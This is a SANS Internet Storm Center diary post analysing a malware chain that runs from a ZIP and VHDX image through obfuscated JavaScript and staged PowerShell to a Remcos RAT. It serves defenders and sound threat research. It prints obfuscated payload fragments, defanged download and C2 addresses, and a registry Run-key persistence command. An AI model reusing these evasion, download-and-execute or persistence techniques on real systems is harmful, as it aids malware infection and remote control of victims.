---
title: From a VHDX File to a Remcos RAT, (Tue, Jun 16th)
url: https://isc.sans.edu/diary/rss/33080
source: SANS Internet Storm Center, InfoCON: green
date: 2026-06-16
fetch_date: 2026-06-17T07:04:10.234399
---

# From a VHDX File to a Remcos RAT, (Tue, Jun 16th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/33072)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

# [From a VHDX File to a Remcos RAT](/forums/diary/From%2Ba%2BVHDX%2BFile%2Bto%2Ba%2BRemcos%2BRAT/33080/)

**Published**: 2026-06-16. **Last Updated**: 2026-06-16 07:09:13 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/From%2Ba%2BVHDX%2BFile%2Bto%2Ba%2BRemcos%2BRAT/33080/#comments)

Yesterday, a reader reported to us a malicious ZIP archive (SHA256: a0104921a2d37ab87482ac9a9f5c3713479c118846c3e999178e75b81620c094[[1](https://www.virustotal.com/gui/file/a0104921a2d37ab87482ac9a9f5c3713479c118846c3e999178e75b81620c094)]). Once unzipped, it contains a VHDX file that discloses a malicious JavaScript after being mounted (which is automatic on modern Windows OSs):

![](https://isc.sans.edu/diaryimages/images/isc-20260616-1.png)

Two different techniques to hide the payload help to bypass most first-line security controls. Using a disk image as a "malware container" has been used multiple times in the past[[2](https://isc.sans.edu/diary/obama224%2Bdistribution%2BQakbot%2Btries%2Bvhd%2Bvirtual%2Bhard%2Bdisk%2Bimages/29294)] but seemed to be less used these days. That’s why I decided to have a look at the JavaScript (SHA256:f65b1271deedcbcbcdd750047f8eb3a5548145546fc2b7847b263a5e52570b33[[3](https://www.virustotal.com/gui/file/f65b1271deedcbcbcdd750047f8eb3a5548145546fc2b7847b263a5e52570b33)]) with a low VT score (only 5/57). Called “Partnerschaft\_fur\_neue\_Angebotsanfrage.js” (“Partnership for new quotation request”), it probably targets German speaking victims. It contains three stages to deliver the last piece of malware.

In the first stage, the JavaScript (obfuscated and hidden in many comments) will launch a PowerShell script through WMI:

```

WbemScripting.SWbemLocator → ConnectServer() → Win32_Process.Create()
```

This technique helps to bypass EDR solutions as well as classic detection rules that monitor parent-child relationships in processes. JavaScript → WMI → PowerShell is less suspicious than a direct relation JavaScript → PowerShell.

The PowerShell script is reconstructed from many strings concatenations and stored in "%LOCALAPPDATA%\Tamale":

```

Fdselsdatoen = Fdselsdatoen + "bubbleFFBVM0lNDgMWDREb' 1;$filmproducbubblentbubblers=otidiform 'DQsSABgGBw0lCBgM';$flygtningbubblelandsbybubbler=otidiform 'bRcOBwcCHw0NC";
Fdselsdatoen = Fdselsdatoen + "BoOChwPCTpKQQgdBQsZEQ4QHAwLDxgsFhZAPQcQBggEXE0JAgUJIBcAAFhNFRwAAgEFCgAVADBN';$succulbubblently=$pritchbubblel;otidiform 'bQMJARYIClMTExEa";
Fdselsdatoen = Fdselsdatoen + "DRcVCTsNBAIYEFdYW1xcPQodFUEZBREGVE0VHAACAQUKABUAME0=' 1;whilbubble (!$prbubblesbytbubblerially118) {otidiform 'bQMJARYIClMwFREfCgoOHi";
...
```

The string “bubble” pollutes the code and is removed during execution..

This second stage PowerShell reconstructs strings by picking every 4th character from garbage strings. There is a function “otidiform” that decrypts Base64-encoded strings with the XOR key “Identificational” (always the same key across all the scripts). Example:

```

otidiform 'bQMJARYIClMWDxIAHAYNBSIBWDU1ChIAFQAABh0zW1YKFgAPAAwvBxAVFQcMC0lILwsXAxEHA0A=' 1
```

Returns:

```

$global:unfishlike=[Activator]::CreateInstance($formene)
```

The script downloads the next stage from:

```

hxxps://cembusconfort[.]ro/Exoticisms121.dsp
```

and saves it to %APPDATA%\Endocoel.Pro.

This file (SHA256:9de90481e57ed0bc0f13bb24747e18cc133f497abe05cfac67517f98098048a1[[4](https://www.virustotal.com/gui/file/9de90481e57ed0bc0f13bb24747e18cc133f497abe05cfac67517f98098048a1/content)]) looks interesting. When you have a first look at it, it seems to be encrypted. The classic behavior is to XOR and encode in Base64 the payload. Here it’s a bit different, the next stage script has been appended at the end of the file. The payload is extracted by carving the interesting code with:

```

.substring(143578, 20305)
```

Once extracted the stage 3 is executed and use the first part of the file as payload (the first 143577 bytes). This stage is a PowerShell reflective .Net loader (classic behaviour) using System.Reflection.Assembly.Load(). The shellcode will fetch the malware itself from:

```

hxxps://cembusconfort[.]ro/YoHtJ27.bin
```

The malware will be injected in a process "backgroundTaskHost.exe" and communicates with the C2 server:

```

animal342[.]duckdns[.]org:53552
```

The traffic has been identified by my sanbox as Remcos, a pretty common RAT.

Or course, persistence is configured via a Run key that executes the PowerShell loader:

```

C:\Windows\System32\cmd.exe" /c REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f /v "Startup key" /t REG_EXPAND_SZ /d "%Statskirken% -windowstyle 2 $Lnforhandlinger=(.'gp' 'HKCU:\Software\Weaverbird\').'Pardonnerer';%Statskirken% ($Lnforhandlinger)"
```

Most of the files used in this infection path remain undetected by most AVs. Here is the complete infection path:

Email → ZIP → VHDX → JavaScript → PowerShell Decoder → PowerShell (.Net Loader) → Shellcode (Downloader) → Remcos

[1] <https://www.virustotal.com/gui/file/a0104921a2d37ab87482ac9a9f5c3713479c118846c3e999178e75b81620c094>
[2] [https://isc.sans.edu/diary/obama224+distribution+Qakbot+tries+vhd+virtual+hard+disk+images/29294](https://isc.sans.edu/diary/obama224%2Bdistribution%2BQakbot%2Btries%2Bvhd%2Bvirtual%2Bhard%2Bdisk%2Bimages/29294)
[3] <https://www.virustotal.com/gui/file/f65b1271deedcbcbcdd750047f8eb3a5548145546fc2b7847b263a5e52570b33>
[4] <https://www.virustotal.com/gui/file/9de90481e57ed0bc0f13bb24747e18cc133f497abe05cfac67517f98098048a1/content>???????

**Xavier Mertens (@xme)**
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://raw.githubusercontent.com/xme/pgp/refs/heads/main/public.key)

Keywords: [VHDX](/tag.html?tag=VHDX) [Remcos](/tag.html?tag=Remcos) [JavaScript](/tag.html?tag=JavaScript) [Malware](/tag.html?tag=Malware)

[0 comment(s)](/diary/From%2Ba%2BVHDX%2BFile%2Bto%2Ba%2BRemcos%2BRAT/33080/#comments)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

* [previous](/diary/33072)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2026 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about...